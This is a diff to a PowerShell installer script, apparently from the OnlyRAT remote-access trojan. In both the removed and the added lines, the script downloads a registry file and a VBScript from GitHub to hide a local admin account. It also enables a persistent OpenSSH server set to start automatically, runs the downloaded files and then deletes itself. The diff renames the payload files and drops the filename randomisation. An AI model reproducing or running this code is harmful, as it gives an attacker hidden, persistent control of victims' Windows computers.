@@ -43,24 +43,18 @@ mkdir $path
 cd $path
 
 # registry to hide local admin
-$reg_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/admin.reg -OutFile "$reg_file.reg"
+Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/wrev.reg -OutFile "wrev.reg"
 
 # visual basic script to register the registry
-$vbs_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
+Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/calty.vbs -OutFile "calty.vbs"
 
 # enabling persistent ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
-Get-NetFirewallRule -Name *ssh*
-
 
 # install the registry
-./"$reg_file.reg";"$vbs_file.vbs"
-
-pause
+./wrev.reg; ./calty
 
 # self delete
 cd $initial_dir
